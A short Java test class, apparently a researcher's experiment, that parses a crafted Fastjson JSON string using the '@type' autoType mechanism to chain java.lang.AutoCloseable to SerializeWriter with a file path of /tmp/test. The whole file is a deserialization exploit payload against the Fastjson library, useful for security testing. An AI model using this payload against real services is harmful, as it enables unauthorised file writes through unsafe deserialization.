package com.example.servletdemo.fastjsontest;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializeWriter;

/**
 * @author : Walker
 * @date : Created in 2022/5/16 5:30 PM
 * @description:
 */
public class test3 {
    public static void main(String[] args) {
        String x = "{ \"@type\": \"java.lang.AutoCloseable\",\n" +
                "                     \"@type\":\"com.alibaba.fastjson.serializer.SerializeWriter\",\n" +
                "                     \"file\":\"/tmp/test\",\n" +
                "                     \"defaultEncoding\":\"UTF-8\"\n" +
                "                    }";
        System.out.println(x);
        JSON.parse(x);
    }
}
